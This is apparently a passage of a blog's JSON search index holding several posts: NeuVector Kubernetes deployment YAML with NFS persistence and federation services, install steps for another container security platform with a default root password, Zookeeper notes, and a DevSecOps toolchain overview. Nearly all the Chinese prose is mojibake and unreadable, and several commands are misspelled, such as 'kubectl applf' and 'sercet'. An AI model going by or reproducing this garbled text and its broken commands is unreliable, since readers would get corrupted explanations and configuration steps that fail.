neuvector-svc-controller.neuvector\n      restartPolicy: Always\n      tolerations:\n      - effect: NoSchedule\n        key: &quot;node-role.kubernetes.io&#x2F;controlplane&quot;\n        operator: Equal\n        value: &quot;true&quot;\n      - effect: NoExecute\n        operator: &quot;Equal&quot;\n        key: &quot;node-role.kubernetes.io&#x2F;etcd&quot;\n        value: &quot;true&quot;\n\næ•°æ®æŒä¹…åŒ–æ–¹æ¡ˆ\né…ç½®ç¯å¢ƒå˜é‡å¯ç”¨é…ç½®æ•°æ®æŒä¹…åŒ–- env:\n  - name: CTRL_PERSIST_CONFIG\né…ç½®æ­¤ç¯å¢ƒå˜é‡åï¼Œé»˜è®¤æƒ…å†µä¸‹ NeuVector-Controller ä¼šå°†æ•°æ®å­˜å‚¨åœ¨ &#x2F;var&#x2F;neuvector ç›®å½•å†…ï¼Œé»˜è®¤æ­¤ç›®å½•æ˜¯ hostpath æ˜ å°„åœ¨ POD æ‰€åœ¨å®¿ä¸»æœºçš„ &#x2F;var&#x2F;neuvector ç›®å½•å†…ã€‚\n\nè‹¥éœ€è¦æ›´é«˜çº§åˆ«æ•°æ®å¯é æ€§ä¹Ÿå¯ä»¥é€šè¿‡ PV å¯¹æ¥ nfs æˆ–å…¶ä»–æ”¯å‡ºå¤šè¯»å†™çš„å­˜å‚¨ä¸­ã€‚\nè¿™æ ·å½“å‡ºç° NeuVector-Controller ä¸‰ä¸ª POD å‰¯æœ¬åŒæ—¶éƒ½é”€æ¯ï¼Œå®¿ä¸»æœºéƒ½å®Œå…¨ä¸å¯æ¢å¤æ—¶ï¼Œä¹Ÿä¸ä¼šæœ‰æ•°æ®é…ç½®æ•°æ®ä¸¢å¤±ã€‚ä»¥ä¸‹ä»¥ NFS ä¸ºä¾‹ï¼Œéƒ¨ç½²NFSåˆ›å»ºPVå’ŒPVCã€‚\ncat &lt;&lt;EOF | kubectl apply -f -\n\napiVersion: v1\nkind: PersistentVolume\nmetadata:\n  name: neuvector-data\nspec:\n  capacity:\n    storage: 10Gi\n  accessModes:\n    - ReadWriteMany \n  nfs:\n    path: &#x2F;nfsdata\n    server: 172.16.0.195 \n\nEOF\ncat &lt;&lt;EOF | kubectl apply -f -\n\nkind: PersistentVolumeClaim\napiVersion: v1\nmetadata:\n  name: neuvector-data\n  namespace: neuvector\nspec:\n  accessModes:\n    - ReadWriteMany\n  resources:\n    requests:\n      storage: 10Gi\nEOF\nä¿®æ”¹ NeuVector-Controller éƒ¨ç½² yamlï¼Œæ·»åŠ  pvc ä¿¡æ¯ï¼Œå°† &#x2F;var&#x2F;neuvector ç›®å½•æ˜ å°„åˆ° nfs ä¸­ï¼ˆé»˜è®¤æ˜¯hostpathæ˜ å°„åˆ°æœ¬åœ°)\nspec:\n  template:\n    spec:\n      volumes:\n        - name: nv-share\n#         hostPath:                        &#x2F;&#x2F; replaced by persistentVolumeClaim\n#           path: &#x2F;var&#x2F;neuvector        &#x2F;&#x2F; replaced by persistentVolumeClaim\n          persistentVolumeClaim:\n            claimName: neuvector-data\næˆ–ç›´æ¥åœ¨ NeuVector éƒ¨ç½² yaml ä¸­æŒ‚è½½ nfs ç›®å½•\nvolumes:\n      - name: nv-share\n        nfs:\n          path: &#x2F;opt&#x2F;nfs-deployment\n          server: 172.26.204.144\nå¤šäº‘å®‰å…¨ç®¡ç†åœ¨å®é™…ç”Ÿäº§åº”ç”¨ä¸­ï¼Œä¼šå­˜åœ¨å¯¹å¤šä¸ªé›†ç¾¤è¿›è¡Œå®‰å…¨è¿›è¡Œç®¡ç†ï¼ŒNeuVector æ”¯æŒé›†ç¾¤è”é‚¦åŠŸèƒ½ã€‚\néœ€è¦åœ¨ä¸€ä¸ªé›†ç¾¤ä¸Šæš´éœ² Federation Master æœåŠ¡ï¼Œåœ¨æ¯ä¸ªè¿œç«¯é›†ç¾¤ä¸Šéƒ¨ç½² Federation Worker æœåŠ¡ã€‚ä¸ºäº†æ›´å¥½çš„çµæ´»æ€§ï¼Œå¯ä»¥åœ¨æ¯ä¸ªé›†ç¾¤åŒæ—¶å¯ç”¨ Federation Master å’Œ Federation Worker æœåŠ¡ã€‚\nåœ¨æ¯ä¸ªé›†ç¾¤éƒ¨ç½²æ­¤ yaml\napiVersion: v1\nkind: Service\nmetadata:\n  name: neuvector-service-controller-fed-master\n  namespace: neuvector\nspec:\n  ports:\n  - port: 11443\n    name: fed\n    nodePort: 30627\n    protocol: TCP\n  type: NodePort\n  selector:\n    app: neuvector-controller-pod\n\n---\n\napiVersion: v1\nkind: Service\nmetadata:\n  name: neuvector-service-controller-fed-worker\n  namespace: neuvector\nspec:\n  ports:\n  - port: 10443\n    name: fed\n    nodePort: 31783\n    protocol: TCP\n  type: NodePort\n  selector:\n    app: neuvector-controller-pod\n\n\n\näº‘åŸç”Ÿå®‰å…¨å¹³å° NeuVector éƒ¨ç½²å¿«é€Ÿä¸Šæ‰‹äº‘åŸç”Ÿå®‰å…¨å¹³å° NeuVectorå®ç”¨æ•™ç¨‹ | äº‘åŸç”Ÿå®‰å…¨å¹³å° NeuVector éƒ¨ç½²äº‘åŸç”Ÿå®‰å…¨äº§å“ NeuVector ç®€ä»‹\n","slug":"å®¹å™¨å®‰å…¨å¹³å°-NeuVector","date":"2022-03-04T09:47:49.000Z","categories_index":"Cloud-Native-Security","tags_index":"äº‘åŸç”Ÿå®‰å…¨,NeuVector,å®¹å™¨å®‰å…¨å¹³å°,suse,äº§å“é€‰å‹","author_index":"Moses"},{"id":"af03dd5b5c07726870f53848ba50413b","title":"å®¹å™¨å®‰å…¨å¹³å°-å°ä½‘ç§‘æŠ€","content":"install\nä¿®æ”¹k8s-dosec-web.yamlå’Œk8s-dosec-configMap.yamlenv:\n  - name:Web_API_ADDR\n  value: &#39;http:&#x2F;&#x2F;masterip:30089&#39;\n  #configmap\n  #æ³¨é‡Šæ‰WEB_API:ä¿®æ”¹ä¸‹é¢å‚æ•°\n  WEB_DOMAIN_NAME: &#39;http:&#x2F;&#x2F;nasterip:30998&#39;\n2.ä¾æ¬¡åº”ç”¨é…ç½®ã€‚ä¹Ÿå¯ä»¥å°è¯•ä½¿ç”¨mainfestæ–¹å¼kubectl applf -f k8s-dosec-rbca.yaml\nkubectl applf -f k8s-dosec-sercet.yaml\nkubectl applf -f k8s-dosec-configMap.yaml\nkubectl applf -f k8s-dosec-db.yaml\nkubectl applf -f k8s-dosec-web.yaml\nkubectl applf -f k8s-dosec-server.yaml\nkubectl applf -f k8s-dosec-agent.yaml\n3.ç™»å½•serveråˆå§‹è´¦å·rootå¯†ç qweASD1234.ä½¿ç”¨æµ‹è¯•license\n\næŠ€æœ¯æŒ‡æ ‡é‡åŒ–æµ‹è¯•\n","slug":"å®¹å™¨å®‰å…¨å¹³å°-å°ä½‘ç§‘æŠ€","date":"2022-03-04T09:35:44.000Z","categories_index":"Cloud-Native-Security","tags_index":"äº‘åŸç”Ÿå®‰å…¨,å®¹å™¨å®‰å…¨å¹³å°,äº§å“é€‰å‹,å°ä½‘ç§‘æŠ€","author_index":"Moses"},{"id":"618a44db788d8cdf326efbd9f5f8d4cf","title":"åˆ†å¸ƒå¼ç³»ç»Ÿå­¦ä¹ -Zookeeper","content":"Zookeeperåœ¨ [[CAP]]ä¸­é€‰æ‹©äº†Cå’ŒPï¼Œåœ¨Leaderæ•…éšœï¼Œé€‰ä¸¾æ–°çš„LeaderæœŸé—´ï¼Œzookeeperé›†ç¾¤ä¸å¯¹å¤–æä¾›æœåŠ¡ã€‚\nç‰¹ç‚¹\nåˆ†å¸ƒå¼åè°ƒ\nå¯é æ€§\næœ‰é›†ç¾¤ä¸å¯ç”¨çš„æ—¶å€™ï¼Œå³leaderä¸‹çº¿ï¼Œfolloweråœ¨é€‰ä¸¾çš„æœŸé—´ï¼Œé›†ç¾¤ä¸å¯ç”¨ã€‚ ä¸€è‡´æ€§\næœ€ç»ˆä¸€è‡´æ€§\nä¸€è‡´æ€§åè®® [[ZAB]]\n\n\næ—¶åº\n\næ‰©å±•æ¶æ„è§’è‰²\nleader\næ”¯æŒå†™ï¼Œæ”¯æŒè¯»\n\n\nfollower\næ”¯æŒè¯»ï¼Œå‚ä¸é€‰ä¸¾\n10ä¸ªäººé€‰ä¸¾å’Œ10äº¿äººé€‰ä¸¾ï¼Œè‡ªç„¶æ˜¯10äººé€‰ä¸¾çš„é€Ÿåº¦å¿«ï¼Œæ‰€ä»¥followerçš„æ•°é‡ä¿è¯é€‰ä¸¾å³å¯ï¼Œæ— éœ€è¿‡å¤šçš„æ•°é‡ã€‚\n\n\nobserver  æ”¯æŒè¯»ï¼Œæ‰©å±•æŸ¥è¯¢çš„æ€§èƒ½ã€‚\n\nè§’è‰²åœ¨zké…ç½®æ–‡ä»¶ä¸­çš„ä½“ç° zoo.cfgserver.1&#x3D;node-001:2888:3888\nserver.2&#x3D;node-001:2888:3888\nerver.3&#x3D;node-001:2888:3888\nserver.4&#x3D;node-001:2888:3888:observer\nserver.5&#x3D;node-001:2888:3888:observer\nserver.6&#x3D;node-001:2888:3888:observer\nserver.7&#x3D;node-001:2888:3888:observer\nå¿«é€Ÿ\næ­£å¸¸æƒ…å†µä¸‹çš„è¯»å†™é€Ÿåº¦å¿«\nå½“leaderæ‰çº¿ï¼Œé€‰ä¸¾æ–°çš„leaderé€Ÿåº¦å¿«ï¼Œé›†ç¾¤æ¢å¤é€Ÿåº¦å¿«ã€‚\n\næ•°æ®å­˜å‚¨\nåœ¨å†…å­˜ä¸­å­˜æ•°æ®çš„çŠ¶æ€ã€‚çŠ¶æ€æ•°æ®å¿…å®šæ˜¯åœ¨æ—¥å¿—æ•°æ®å†™å…¥æˆåŠŸä¹‹åï¼Œæ‰æœ‰å¯èƒ½ç”Ÿæˆã€‚\nåœ¨ç£ç›˜ä¸­å†™æ—¥å¿—ã€‚å½“ç„¶ï¼Œæ—¥å¿—ä¹Ÿæ˜¯å…ˆå†™åˆ°å†…å­˜ï¼Œå†åˆ°ç£ç›˜ï¼Œå†…å­˜ä¸­çš„çŠ¶æ€æ•°æ®å’Œæ—¥å¿—æ•°æ®æ˜¯ä¸¤ç±»æ•°æ®ã€‚\n\nServerClient\nwatch\nnew zk æ—¶ä¼ å…¥çš„watch\næ˜¯sessionçº§åˆ«ï¼Œè·Ÿpathï¼Œnodeæ²¡æœ‰å…³ç³»ã€‚\nsessionçŠ¶æ€å‘ç”Ÿå˜åŒ–ï¼Œä¼šè¢«é‡å¤è§¦å‘ã€‚\nå½“ä¸è¿æ¥çš„æœåŠ¡å™¨ä¸­æ–­è¿æ¥ï¼Œè‡ªåŠ¨é‡è¿åï¼ŒsessionIdä¸å‘ç”Ÿå˜åŒ–ã€‚\n\n\næ™®é€šçš„watch\nä¸€æ¬¡æ€§ï¼Œä¸ä¼šé‡å¤è¢«è§¦å‘ï¼Œè¦æƒ³é‡å¤è§¦å‘ï¼Œæ¯æ¬¡è§¦å‘åï¼Œè¦å†watchã€‚\n\n\n\n\n\nå“åº”å¼ç¼–ç¨‹ä¸å¸¸è§„ç¼–ç¨‹çš„ä¸»è¦å·®å¼‚ï¼šå·¥ç¨‹å¸ˆç”±ä¸šåŠ¡æ‰§è¡Œé€»è¾‘é¡ºåºçš„è§„åˆ’è€…ï¼Œç¼–ç¨‹ä¸šåŠ¡å†…å®¹çš„è§„åˆ’è€…ï¼Œæ‰§è¡Œé¡ºåºäº¤ç»™è®¡ç®—æœºæ¥è°ƒåº¦ã€‚\nåº”ç”¨åœºæ™¯\nåˆ†å¸ƒå¼é…ç½®ï¼ŒæœåŠ¡æ³¨å†Œå‘ç°\nåˆ†å¸ƒå¼é”\nåˆ†å¸ƒå¼åè°ƒ\n\n","slug":"ZooKeeper","date":"2022-02-15T00:57:00.000Z","categories_index":"åˆ†å¸ƒå¼","tags_index":"åˆ†å¸ƒå¼ç³»ç»Ÿ,åˆ†å¸ƒå¼ç†è®º,CAP,Zookeeper","author_index":"Moses"},{"id":"1a872c8e58dbc5f12955fd570dcb5da9","title":"DevSecOpså·¥å…·é“¾","content":"DevSecOpså®è·µGartneråœ¨2019å¹´çš„ä¸€ç¯‡æ–‡ç« ä¸­ç»™å‡ºäº†ä¸€ä¸ªç»è¿‡è°ƒç ”å’Œåˆ†æçš„æ¯”è¾ƒå…¨é¢çš„å®è·µæ¸…å•ã€‚å¦‚å›¾å®ƒç”±ä¸€äº›åˆ—å…³é”®è·¯å¾„å’ŒæŒç»­æ­¥éª¤ä¸­çš„æªæ–½å’Œæœºåˆ¶ç»„æˆï¼Œå‘¨è€Œå¤å§‹ç¬¬è¿è½¬ã€‚å®ƒçš„å…³æ³¨ç‚¹ä¸»è¦æ˜¯åœ¨ç ”å‘è¿‡ç¨‹ä¸­çš„å®‰å…¨æ¼æ´åŠå…¶å¼•å‘çš„å„ç±»é£é™©çš„ç®¡æ§ã€‚\n\nå¿˜è®°äº†ğŸ˜„\næŸè¯åˆ¸å…¬å¸DevSecOpsè½åœ°å®è·µ\næ‚¬é•œå®‰å…¨å¼€å‘å·¥å…·é“¾\né»˜å®‰ç§‘æŠ€DevSecOpså·¥å…·é“¾\næºç¨‹DevSecOpså®è·µ\nå¼€æºç½‘å®‰\n\n1.planï¼ˆéœ€æ±‚å’Œæ¶‰åŠï¼‰\nå¿è¿˜å®‰å…¨å€ºåŠ¡ï¼šç±»ä¼¼ç³»ç»Ÿç ”å‘è¿‡ç¨‹ä¸­çš„æŠ€æœ¯å€ºåŠ¡ï¼ŒDevSecOpsä¹Ÿä¼šå‡ºç°å®‰å…¨å€ºåŠ¡ã€‚éœ€è¦è®¤è¯†åˆ°é£é™©å¹¶ä¸”åˆ¶å®šè®¡åˆ’é€æ­¥å¿è¿˜ï¼Œå¦åˆ™æ—©æ™šæœ‰ä¸€å¤©ä¼šé€ æˆä¸¥é‡çš„å®‰å…¨äº‹æ•…ã€‚\nåº¦é‡ä¸æŒ‡æ ‡ï¼šæ¨èDevSecOpséœ€è¦è‰¯å¥½çš„åº¦é‡æ–¹å¼ï¼Œæ­£ç¡®åœ°é€‰æ‹©æŒ‡æ ‡å’Œåˆç†åœ°ä½¿ç”¨åº¦é‡ï¼Œå¯ä»¥å¸®åŠ©å›¢é˜Ÿå¾—åˆ°æŒç»­æ”¹è¿›çš„æˆæœã€‚ç¼ºé™·å¯†åº¦ã€æ¥¼æ ‹æ•°ã€é£é™©é—®é¢˜[[DevSecOpsåº¦é‡#DevSecOpsåº¦é‡æŒ‡æ ‡]]\nè½»é‡æœ‰æ•ˆçš„å¨èƒå»ºæ¨¡ï¼šé™¤äº†ä¼ ç»Ÿæ„ä¹‰ä¸Šå¨èƒå»ºæ¨¡æ–¹æ³•è®ºå’Œå·¥å…·ä»¥å¤–ï¼Œå¿«é€Ÿçš„å®‰å…¨è‡ªæŸ¥æ¸…å•ã€å®‰å…¨çŸ¥è¯†åº“ç­‰éƒ½æ˜¯ä¸€äº›æœ‰ç›Šçš„æ¢ç´¢ã€‚ç›®çš„éƒ½æ˜¯å°†éœ€æ±‚å’Œè®¾è®¡çš„å®‰å…¨è¯„ä¼°æ¨ä¸ŠæŒç»­æ„å»ºçš„å¿«è½¦é“ã€‚\nå®‰å…¨æµç¨‹å’Œå®‰å…¨å·¥å…·çš„ä½¿ç”¨åŸ¹è®­ï¼šDevSecOpså·¥å…·å¯ä»¥å¸®åŠ©å›¢é˜Ÿå‘ç°é—®é¢˜ï¼Œä½†æœ€ç»ˆè§£å†³å®‰å…¨é—®é¢˜çš„è¿˜æ˜¯äººã€‚å¯æ ¹æ®ç°æœ‰å¼€å‘æµç¨‹ä¸­æ„å»ºå®‰å…¨éœ€æ±‚&amp;è®¾è®¡&amp;è¯„å®¡æµç¨‹\nä¾›åº”å•†è¯„ä¼°ï¼šå¼€æºäº§å“å¼•å…¥è¯„ä¼°ã€è½¯ä»¶ä¾›åº”å•†è¯„ä¼°\nå®‰å…¨ç¼–ç è§„èŒƒ&amp;åŸ¹è®­\n\n2.Createï¼ˆç¼–ç &#x2F;ç¼–è¯‘ï¼‰\nIDEæ’ä»¶ï¼šå³å„ç±»å®‰å…¨æ¼æ´æ‰«æã€å¼€æºç»„ä»¶ç‰ˆæœ¬ç”šè‡³æ˜¯ä»£ç è´¨é‡ã€ä»£ç é£æ ¼æ£€æŸ¥ç­‰å·¥å…·ï¼Œå¯ä»¥è®©ç ”å‘äººå‘˜åœ¨ç¼–ç æ—¶å‘ç°å’Œæ¶ˆé™¤ä¸€äº›æ½œåœ¨çš„å®‰å…¨é£é™©ã€‚å¦‚ [[ä»£ç å®¡è®¡-OWASP project-find-sec-bugs|OWASPé¡¹ç›®ä¹‹find-sec-bugs]] [[ä½¿ç”¨snykæ£€æŸ¥å¼€æºè½¯ä»¶ä¾èµ–ä¸­çš„æ¼æ´.md]]ã€é˜¿é‡ŒJavaæ£€æµ‹æ’ä»¶ã€sonaræ’ä»¶ã€é™Œé™Œå®‰å…¨æ’ä»¶ã€Dependency-Checkç­‰\næ ‡å‡†åŒ–åŠ å›ºï¼šåŸºçº¿å®‰å…¨CIS Benchmark\n\n3.Verifyï¼ˆæµ‹è¯•&#x2F;éªŒè¯ï¼‰\né™æ€åº”ç”¨å®‰å…¨æµ‹è¯•ï¼ˆStatic Application Security Testï¼ŒSASTï¼‰ï¼šæŒ‡é’ˆå¯¹æºä»£ç è¿›è¡Œé™æ€åˆ†æï¼Œä»ä¸­æ‰¾åˆ°å®‰å…¨æ¼æ´çš„æµ‹è¯•æ–¹å¼ï¼Œæœ‰äº›å·¥å…·ä¹Ÿä¼šä¾èµ–äºç¼–è¯‘è¿‡ç¨‹ç”šè‡³æ˜¯äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œé€šè¿‡ä¸€äº›æŠ½è±¡è¯­æ³•æ ‘ã€æ§åˆ¶æµåŠæ±¡ç‚¹è¿½è¸ªç­‰æŠ€æœ¯æ‰‹æ®µæ¥æå‡æ£€æµ‹è¦†ç›–åº¦å’Œå‡†ç¡®åº¦ï¼Œä¹Ÿç§°ç™½ç›’æµ‹è¯•ã€‚[[SASTæ–¹æ¡ˆè°ƒç ”]]\nåŠ¨æ€åº”ç”¨å®‰å…¨æµ‹è¯•ï¼ˆDynamic Application Security Testï¼ŒDASTï¼‰ï¼šæŒ‡åœ¨æµ‹è¯•æˆ–è¿è¡Œé˜¶æ®µåˆ†æåº”ç”¨ç¨‹åºçš„åŠ¨æ€è¿è¡ŒçŠ¶æ€ã€‚åœ¨ä¸éœ€è¦ç³»ç»Ÿæºç çš„æƒ…å†µä¸‹ï¼Œé€šè¿‡æ¨¡æ‹Ÿé»‘å®¢è¡Œä¸ºç»™åº”ç”¨ç¨‹åºæ„é€ ç‰¹å®šçš„è¾“å…¥ï¼Œåˆ†æåº”ç”¨ç¨‹åºçš„è¡Œä¸ºå’Œååº”ï¼Œä»è€Œç¡®å®šè¯¥åº”ç”¨æ˜¯å¦å­˜åœ¨æŸäº›ç±»å‹çš„å®‰å…¨æ¼æ´ï¼Œä¹Ÿç§°é»‘ç›’æµ‹è¯•ã€‚\näº¤äº’å¼åº”ç”¨å®‰å…¨æµ‹è¯•ï¼ˆInteractive Application Security Testï¼ŒIASTï¼‰ï¼šæŒ‡å¯»æ±‚å°†å¤–éƒ¨åŠ¨æ€å’Œå†…éƒ¨é™æ€åˆ†ææŠ€æœ¯ç»“åˆèµ·æ¥ã€‚å¸¸è§çš„IASTæœ‰ä»£ç†å’Œæ’æ¡©ä¸¤ç§æ¨¡å¼ã€‚ä»£ç†æ¨¡å¼æ˜¯åœ¨PCç«¯æµè§ˆå™¨æˆ–è€…ç§»åŠ¨ç«¯Appè®¾ç½®ä»£ç†ï¼Œé€šè¿‡ä»£ç†æ‹¿åˆ°åŠŸèƒ½æµ‹è¯•çš„æµé‡ï¼Œåˆ©ç”¨åŠŸèƒ½æµ‹è¯•æµé‡æ¨¡æ‹Ÿå¤šç§æ¼æ´çš„æ£€æµ‹æ–¹å¼ã€‚æ’æ¡©æ¨¡å¼ï¼ˆåˆ†ä¸ºä¸»åŠ¨å’Œè¢«åŠ¨æ’æ¡©ï¼‰æ˜¯åœ¨ä¿è¯ç›®æ ‡ç¨‹åºåŸæœ‰é€»è¾‘å®Œæ•´çš„æƒ…å†µä¸‹ï¼Œåœ¨ç‰¹å®šçš„ä½ç½®æ’å…¥æ¢é’ˆï¼Œåœ¨åº”ç”¨ç¨‹åºè¿è¡Œæ—¶ï¼ŒåŒæ¢é’ˆè·å–è¯·æ±‚ã€ä»£ç ã€æ•°æ®æµå’Œæ§åˆ¶æµç­‰ï¼ŒåŸºäºæ­¤ç»¼åˆåˆ†æå’Œåˆ¤æ–­æ¼æ´ã€‚ä¹Ÿç§°ç°ç›’æµ‹è¯•.\nè½¯ä»¶æˆåˆ†åˆ†æï¼ˆSoftware Composition Analysisï¼ŒSCAï¼‰ï¼šé’ˆå¯¹ç¬¬ä¸‰æ–¹å¼€æºä»£ç ç»„ä»¶&#x2F;åº“çš„ä½ç‰ˆæœ¬æ¼æ´æ£€æµ‹å·¥å…·ä¹Ÿè¢«é›†ä¸­åˆ°IDEå®‰å…¨æ’ä»¶ä¸­ï¼Œç¼–ç çš„æ—¶å€™å¼•å…¥å°±ä¼šæœ‰å®‰å…¨æç¤ºï¼Œç”šè‡³ä¿®æ­£å¼•å…¥åº“çš„ç‰ˆæœ¬æ¥ä¿®å¤æ¼æ´ã€‚\n\nSASTã€DASTå’ŒIASTçš„å¯¹æ¯”\n\n\n\nå¯¹æ¯”é¡¹\nSAST\nDAST\nIAST\n\n\n\næµ‹è¯•å¯¹è±¡\næºä»£ç \nè¿è¡Œæ—¶çš„åº”ç”¨ç¨‹åº\nè¿è¡Œæ—¶çš„åº”ç”¨ç¨‹åº\n\n\næµ‹è¯•å‡†å¤‡\nç®€å•\nè´Ÿè´£\nè´Ÿè´£\n\n\næµ‹è¯•æ–¹æ³•\nç™½ç›’\né»‘ç›’\nç°ç›’\n\n\néƒ¨ç½²æˆæœ¬\nä½\nä½\nä½\n\n\nè¯¯æŠ¥ç‡\né«˜\nä½\næä½\n\n\nä½¿ç”¨æˆæœ¬\né«˜ï¼Œäººå·¥æ’é™¤è¯¯æŠ¥\nè¾ƒä½ï¼ŒåŸºæœ¬æ— çº¿äººå·¥éªŒè¯\nä½ï¼ŒåŸºæœ¬æ²¡æœ‰è¯¯æŠ¥\n\n\næ¼æ´æ£€å‡ºç‡\né«˜\nä¸­\nä½\n\n\nä¾µå…¥æ€§\nä½\né«˜\nä½\n\n\nè„æ•°æ®\nè¾ƒå°‘\néå¸¸å¤š\nå‡ ä¹æ²¡æœ‰\n\n\né›†æˆé˜¶æ®µ\nç ”å‘é˜¶æ®µ\næµ‹è¯•&#x2F;çº¿ä¸Šè¿è¥é˜¶æ®µ\næµ‹è¯•é˜¶æ®µ\n\n\næµ‹è¯•è¦†ç›–ç‡\né«˜\nä½\né«˜\n\n\næ£€æµ‹é€Ÿåº¦\néšä»£ç é‡å‘ˆæŒ‡æ•°å¢é•¿\néšæµ‹è¯•ç”¨ä¾‹æ•°é‡ç¨³å®šå¢é•¿\nå®æ—¶æ£€æµ‹\n\n\né€»è¾‘æ¼æ´æ£€æµ‹\nä¸æ”¯æŒ\néƒ¨åˆ†æ”¯æŒ\néƒ¨åˆ†æ”¯æŒ\n\n\nå½±å“æ¼æ´æ£€å‡ºç‡å› ç´ \nä¸è§„åˆ™æœ‰å…³ï¼Œä¼ä¸šå¯å®šåˆ¶è§„åˆ™\nä¸æµ‹è¯•playloadè¦†ç›–åº¦æœ‰å…³\nä¸æ£€æµ‹æ–¹å¼æœ‰å…³ï¼Œä¼ä¸šå¯å®šåˆ¶æµ‹é‡æ–¹å¼\n\n\nç¬¬ä¸‰æ–¹ç»„ä»¶æ¼æ´æ£€æµ‹\nä¸æ”¯æŒ\næ”¯æŒ\næ”¯æŒ\n\n\næ”¯æŒè¯­è¨€\nåŒºåˆ†è¯­è¨€\nä¸åŒºåˆ†è¯­è¨€\nåŒºåˆ†è¯­è¨€\n\n\næ”¯æŒæ¡†æ¶\nåŒºåˆ†æ¡†æ¶\nä¸åŒºåˆ†æ¡†æ¶\nåŒºåˆ†æ¡†æ¶\n\n\né£é™©ç¨‹åº¦\nä½\nè¾ƒé«˜\nä½\n\n\næ¼æ´è¯¦æƒ…\nè¾ƒé«˜ã€æ•°æ®æµ+ä»£ç è¡Œæ•°\nä¸­ï¼Œè¯·æ±‚\né«˜ï¼Œè¯·æ±‚+æ•°æ®æµ+ä»£ç è¡Œæ•°\n\n\nCI&#x2F;CDé›†æˆ\næ”¯æŒ\nä¸æ”¯æŒ\næ”¯æŒ\n\n\n4.Preprodï¼ˆé¢„å‘å¸ƒï¼‰\næ··åŠ¨å·¥ç¨‹ï¼ˆChaos Engineering):Security Monkey\nFuzzingï¼šæ¨¡ç³Šæµ‹è¯•OWASP Mantra\né›†æˆæµ‹è¯•ï¼šæ–¹æ³•ç±»ä¼¼SASTã€DASTã€IASTç­‰ã€‚\n\n5.Preventï¼ˆé¢„é˜²ï¼‰\nå®Œæ•´æ€§æ£€æµ‹ï¼šå®Œæ•´æ€§æ£€æŸ¥å™¨å¯ä»¥æ£€æµ‹ä»»ä½•å…³é”®çš„ç³»ç»Ÿæ–‡ä»¶æ˜¯å¦å·²è¢«æ›´æ”¹ï¼Œä»è€Œæ˜¯ç³»ç»Ÿç®¡ç†å‘˜å¯ä»¥æŸ¥æ‰¾æœªç»æˆæƒçš„ç³»ç»Ÿæ›´æ”¹ï¼›ä¹Ÿå¯ä»¥æ£€æŸ¥å­˜å‚¨çš„æ–‡ä»¶æˆ–ç½‘ç»œæ•°æ®åŒ…ï¼Œä»¥ç¡®å®šä»–ä»¬æ˜¯å¦å·²è¢«æ›´æ”¹ã€‚\nçºµæ·±é˜²å¾¡æªæ–½ï¼šå³Defence-in-Depth(DiD)\næ”»å‡»é¢ç®¡ç†ï¼šå³(Attack Surface Management ,ASM)\n\n6.Detect(æ£€æµ‹)\nRASPï¼š[[RASPæŠ€æœ¯ç®€ä»‹]]å®ƒçš„åº•å±‚æŠ€æœ¯å®ç°å¯èƒ½ä¸æŸäº›IASTç±»ä¼¼ï¼Œä½†æ˜¯è¯¥æ–¹æ¡ˆå¸¦æ¥å·¨å¤§æ”¶ç›Šçš„åŒæ—¶ä¹Ÿå› ä¸ºä¿®æ”¹äº†è¿è¡Œæ—¶ç¯å¢ƒçš„åº•å±‚ï¼Œå¯èƒ½å¯¹åº”ç”¨çš„æ€§èƒ½ã€å…¼å®¹æ€§å’Œç¨³å®šæ€§é€ æˆæˆ–å¤šæˆ–å°‘çš„å½±å“ï¼Œåœ¨è¯„ä¼°å’Œå®ç°æ–¹æ¡ˆæ—¶éœ€è¦é‡ç‚¹è€ƒè™‘å’Œåº”å¯¹ã€‚\nUEBA&#x2F;ç½‘ç»œç›‘æ§ï¼š\næ¸—é€æµ‹è¯•ï¼š\n\n7.Respond(å“åº”)\nå®‰å…¨ç¼–æ’ï¼šï¼ˆSecurity Orchestrationï¼ŒSO):å®šä¹‰å®‰å…¨äº‹ä»¶åˆ†æä¸è‡ªåŠ¨åŒ–å“åº”å·¥ä½œæµç¨‹ã€‚é‡‡é›†å„è‡ªè¿è¥å›¢é˜Ÿå…³å¿ƒçš„å®‰å…¨æ£€æµ‹ç³»ç»Ÿæ•°æ®ï¼Œå¯¹å®ƒä»¬è¿›è¡Œåˆ†æä¸åˆ†ç±»ï¼Œåˆ©ç”¨æœ€èµ„æ·±å®‰å…¨åˆ†æäººå‘˜çš„ä¸“å®¶ç»éªŒï¼Œè‡ªåŠ¨åŒ–å®šä¹‰ã€æ’åºå’Œé©±åŠ¨æŒ‰æ ‡å‡†å·¥ä½œæµç¨‹æ‰§è¡Œçš„å®‰å…¨äº‹ä»¶å“åº”æ´»åŠ¨ã€‚å®‰å…¨ç¼–æ’åˆè¯¦ç»†å®šä¹‰ä¸ºå®‰å…¨ç¼–æ’ä¸è‡ªåŠ¨åŒ–ã€å®‰å…¨äº‹ä»¶å“åº”å¹³å°å’Œå¨èƒæƒ…æŠ¥å¹³å°ä¸‰ç§æŠ€æœ¯&#x2F;å·¥å…·çš„èåˆã€‚\nWAFï¼šé™¤äº†åº”å¯¹ä¼ ç»Ÿçš„webæ¼æ´æ”»å‡»ã€CCæ”»å‡»ä»¥å¤–ï¼ŒWAFä¹Ÿé€æ¸å‘æ˜æå‡ºäº†åçˆ¬è™«ã€æ‰“å‡»ç¾Šæ¯›å…šç­‰åœºæ™¯ï¼Œå°†å®‰å…¨èƒ½åŠ›ä»æ¼æ´é˜²æŠ¤æ‰©å±•åˆ°ä¸šåŠ¡å®‰å…¨é¢†åŸŸã€‚\nå¨èƒæƒ…æŠ¥å¹³å°ï¼šå³ï¼ˆThreat intelligence Platformï¼ŒTIPï¼‰ã€‚æä¾›æœ¬åœ°åŒ–ã€å…¨æ–¹ä½çš„å¨èƒæƒ…æŠ¥èƒ½åŠ›ï¼ŒåŒ…æ‹¬åŠæ—¶å‘ç°å…³é”®å¨èƒã€å¯¹å·²æœ‰æŠ¥è­¦è¿›è¡Œäº”å®ç­›é™¤æˆ–åˆ†çº§ã€ä¸ºäº‹ä»¶å½±å“æä¾›å†³ç­–éœ€è¦çš„ä¸Šä¸‹æ–‡ã€æä¾›å®‰å…¨é¢„è­¦èƒ½åŠ›ã€æä¾›è‡ªæœ‰æƒ…æŠ¥è¿è¥èƒ½åŠ›ç­‰ã€‚\nååŒäº‹ä»¶å“åº”å¹³å°ï¼šCollaborative Incident Response platformï¼Œè‡ªåŠ¨åŒ–å“åº”(Auto 